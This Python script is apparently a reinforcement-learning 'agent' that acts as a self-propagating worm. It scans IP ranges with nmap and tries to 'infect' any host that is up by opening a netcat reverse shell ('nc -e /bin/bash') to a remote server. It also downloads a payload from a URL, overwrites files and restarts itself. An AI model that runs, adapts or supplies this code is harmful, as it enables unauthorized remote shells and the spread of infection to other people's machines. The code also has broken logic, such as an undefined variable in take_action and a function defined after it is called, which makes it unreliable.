import argparse
import os
import shutil
import subprocess
import sys
import threading
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Dict, List, NamedTuple, Optional, Tuple
import numpy as np
import psutil
import signal
import pickle
import socket
import nmap
import random

class State(NamedTuple):
    ip: str
    state_number: int

class LongTermMemory:
    def __init__(self, capacity=1000):
        self.memory = []
        self.capacity = capacity

    def store(self, experience):
        self.memory.append(experience)
        if len(self.memory) > self.capacity:
            self.memory.pop(0)

    def retrieve(self, state):
        return [exp for exp in self.memory if exp[0] == state]

    def best_action(self, state: State) -> Optional[int]:
        experiences = self.retrieve(state)
        if experiences:
            actions = {}
            for s, a, r, next_s in experiences:
                if a not in actions:
                    actions[a] = []
                actions[a].append(r)
            return max(actions, key=lambda x: np.mean(actions[x])) if actions else None
        return None

long_term_memory = LongTermMemory()

# Constants
NETCAT_BINARY = "/bin/nc"  # Replace with the actual path if need be
MAX_EPISODES = 1000
MAX_STATE = 10000
REWARD_SUCCESS = 10
REWARD_FAILURE = -5
DISCOUNT_FACTOR = 0.9
LEARNING_RATE = 0.1
MAX_MEMORY = 100  # Adjust as needed
INITIAL_EXPLORATION_PROBABILITY = 1.0
EXPLORATION_DECAY = 0.995

# Action map (global)
action_map = {
    0: "try_infect",
    1: "perform_self_healing",
    2: "propagate",
    3: "check_self_awareness",
    4: "explore_environment",
}


def symbolic_reasoning(state: State) -> Optional[int]:
    """Use symbolic reasoning to choose an action based on the state."""
    if state.state_number < 10:
        return 0  # Try infecting when in early states
    elif state.state_number < 50:
        return 2  # Propagate when in intermediate states
    elif state.state_number >= 50:
        return 1  # Perform self-healing when in later states
    return None


def try_infect(ip: str) -> bool:
    """Try to infect a machine with an IP address of ip."""
    try:
        subprocess.run([NETCAT_BINARY, "-e", "/bin/bash", REMOTE_SERVER, str(PORT)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError) as e:
        return False

def perform_self_healing(ip: str) -> bool:
    """Perform self-healing actions."""
    try:
        pid = os.getpid()
        os.kill(pid, 0)  # Check if process exists
    except OSError:
        return False
    
    src = Path("/path/to/original/file")  # Replace with your actual paths
    dst = Path("/path/to/compromised/file")
    if not src.exists() or not dst.exists() or src.samefile(dst):
        return False

    try:
        shutil.copyfile(src, dst)  # Copy before restarting
        os.execv(sys.executable, ['python'] + sys.argv)  # Restart the script
        return True # Shouldn't reach here due to execv
    except Exception as e:
        print(f"Self-healing error: {e}", file=sys.stderr)
        return False


def propagate(ip_range: List[str]) -> bool:
    """Scan for and attempt to infect vulnerable machines."""
    vulnerable_machines = []
    with ThreadPoolExecutor() as executor:
        future_to_ip = {executor.submit(is_vulnerable, ip): ip for ip in ip_range}
        for future in future_to_ip:
            ip = future_to_ip[future]
            try:
                if future.result():
                    vulnerable_machines.append(ip)
            except Exception as e:
                print(f"Error checking vulnerability of {ip}: {e}", file=sys.stderr)
                pass

    for ip in vulnerable_machines:
        try_infect(ip)

    return len(vulnerable_machines) > 0



def is_vulnerable(ip: str) -> bool:

    """Check if a host is deemed vulnerable (example implementation)."""
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=ip, arguments='-F') # Fast scan
        for host in nm.all_hosts():
            if nm[host].state() == 'up':
                return True  # Consider host vulnerable if up regardless of port status
        return False
    except nmap.PortScannerError as e:
        print(f"Nmap scan error for {ip}: {e}", file=sys.stderr)
        return False




def check_self_awareness(ip: str) -> bool:
    """Check if agent is aware of its own state/status."""
    try:
        mem_usage = psutil.Process(os.getpid()).memory_info().rss / (1024 * 1024)
        if mem_usage > MAX_MEMORY:
            return False
        return True
    except Exception as e:
        print(f"Self-awareness check error: {e}", file=sys.stderr)  # Log errors
        return False



def explore_environment(ip: str) -> bool:
  """Gather information about the local environment (example)."""
  try:
      hostname = socket.gethostname()
      local_ip = socket.gethostbyname(hostname)
      print(f"Explored environment: Hostname={hostname}, IP={local_ip}", file=sys.stderr)
      return True # Consider successful if no error
  except Exception as e:

      print(f"Environment exploration error: {e}", file=sys.stderr)
      return False



def update_state(state: State, action: int) -> State:
    """Update the current state based on the action taken."""
    state_updates = {
        0: lambda s: State(s.ip, s.state_number + 1),
        1: lambda s: State(s.ip, max(0, s.state_number - 1)),  # Prevent negative state numbers
        2: lambda s: State(s.ip, s.state_number * 2),
        3: lambda s: State(s.ip, s.state_number // 2),
        4: lambda s: State(s.ip, s.state_number + 5),
    }
    return state_updates.get(action, lambda s: s)(state)



def download_payload(payload_url: str) -> str:
    """Download the payload from a URL."""
    try:
        with urllib.request.urlopen(payload_url) as f:
            return f.read().decode("utf-8")
    except urllib.error.URLError as e:
        print(f"Payload download error: {e}", file=sys.stderr)
        sys.exit(1)

def curriculum_learning_setup(ip_range: List[str]) -> List[str]:
    """Setup curriculum learning (example: sort by last octet)."""
    return sorted(ip_range, key=lambda ip: int(ip.split('.')[-1]) if '.' in ip and ip.split('.')[-1].isdigit() else float('inf'))

def choose_action(q_table, state, exploration_probability):
    best_ltm_action = long_term_memory.best_action(state)
    if best_ltm_action is not None:
        return best_ltm_action

    symbolic_action = symbolic_reasoning(state)
    if symbolic_action is not None:
        return symbolic_action

    if np.random.rand() < exploration_probability:
        return random.choice(list(action_map.keys()))  # Choose a random action
    else:
        if state in q_table and q_table[state]:
            return max(q_table[state], key=q_table[state].get)
        else:
            return random.choice(list(action_map.keys()))

def main(ip_range, remote_server, port, payload_url):
    q_table = {}
    exploration_probability = INITIAL_EXPLORATION_PROBABILITY
    payload = download_payload(payload_url)
    ip_range = curriculum_learning_setup(ip_range)

    for episode in range(MAX_EPISODES):
        for ip in ip_range:
            state = State(ip, 0)
            while True:
                if state not in q_table:
                    q_table[state] = {action: 0.0 for action in action_map}

                action = choose_action(q_table, state, exploration_probability)
                reward, next_state = take_action(action, state.ip)  # Corrected function call

                if next_state is not None: 
                    if next_state not in q_table:
                        q_table[next_state] = {action: 0.0 for action in action_map}  
                    next_action = choose_action(q_table, next_state, exploration_probability)
                    q_table[state][action] += LEARNING_RATE * (reward + DISCOUNT_FACTOR * q_table[next_state][next_action] - q_table[state][action])

                    long_term_memory.store((state, action, reward, next_state))

                exploration_probability *= EXPLORATION_DECAY
                state = next_state if next_state else state

                if check_self_awareness(state.ip) or state.state_number >= MAX_STATE:
                    break  # Exit inner loop (state or episode termination)

            if episode % 10 == 0:
                perform_self_healing(state.ip)
                propagate(ip_range)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="A Q-learning agent for a cybersecurity scenario.")
    parser.add_argument("ip_range", nargs="+", type=str, help="A list of IP addresses to scan.")
    parser.add_argument("--remote-server", type=str, default="example.com", help="The remote server to connect to.")
    parser.add_argument("--port", type=int, default=8080, help="The port to connect to on the remote server.")
    parser.add_argument("--payload-url", type=str, required=True, help="The URL of the payload to download and execute.") #Made payload-url required
    args = parser.parse_args()

    REMOTE_SERVER = args.remote_server
    PORT = args.port

    # Call the main function
    main(args.ip_range, args.remote_server, args.port, args.payload_url)

#take_action function included from previous responses
def take_action(action: int, ip: str) -> Tuple[Optional[float], Optional[State]]:
    """Take an action and return the reward and the next state."""

    action_name = action_map.get(action)
    if action_name:

        action_function = globals().get(action_name)
        if action_function:
            success = action_function(ip) # assume all actions take ip as argument
            reward = REWARD_SUCCESS if success else REWARD_FAILURE
            next_state = update_state(State(ip,state.state_number ), action) if success else None
            return reward, next_state
        else:
            print(f"Error: Action function '{action_name}' not found.", file=sys.stderr)
            return REWARD_FAILURE, None 
    else:
        print(f"Error: Invalid action: {action}", file=sys.stderr)
        return REWARD_FAILURE, None
